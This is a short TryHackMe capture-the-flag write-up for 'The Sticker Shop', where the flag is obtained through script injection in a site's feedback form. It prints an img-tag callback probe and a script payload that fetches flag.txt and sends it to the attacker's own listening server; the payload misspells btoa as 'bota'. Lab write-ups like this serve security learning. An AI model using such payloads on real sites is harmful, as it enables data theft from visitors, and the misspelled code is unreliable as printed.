# The Sticker Shop

# CTF writeup

- **Platform** : **TryHackMe**
- **Name** : **The Sticker Shop**
- **Difficulty** : **Easy**
- **Category** : **Web**
- **Solution** : **Script Injection attack**
- **Date Completed** : **23.10.2026**


## Objective

The goal of this challenge is to capture the flag hidden in the website.

## Methodology

I use script injection attack to connect to my device via python http server.

## Actions

### step 1

I first check to the website from the instruction.

        http://<TARGET_IP>:8080/flag.txt

**Observation**

It says
        '401 Unauthorized'

### step 2

Then I go to the original site.

        http://<TARGET_IP>:8080/

**Observation**

It's a sticker shop website.

OHH It has user input-box in Feedback page.

### step 3

Let's try some injection test to see if the website is vulnerable or not.

I type this in user input-box and click submit:

        <img src='http://<YOUR_Machine_IP>:8081'>

And this in my terminal:

        python3 -m http.server 8081

**Observaion**

YEAHHH it has connection.


**Analysis**

As We can see the website is vulnerable to some injection attacks.
We gonna use that to obtain our flag.

### step 4

Then I use some online sources to find html script . This one works for me

        <script>
        fetch('http://127.0.0.1:8080/flag.txt')
                .then(r => r.text())
                .then(t => fetch('http://<YOUR_MACHINE_IP>:8000/?' + bota(t)));
        </script>

### step 5

I type this script in website input-box and the one below in my terminal

        python3 -m http.server 8000

**FIndings**

OK, I get the flag but I think it's encoded in base64 I think, so Let's decode that in cyberchef.com.

**Cyberchef**

I drag and drop 'from Base64' into the recipe box.

Yes FLAGGG!!

#CHALLENGE COMPLETED
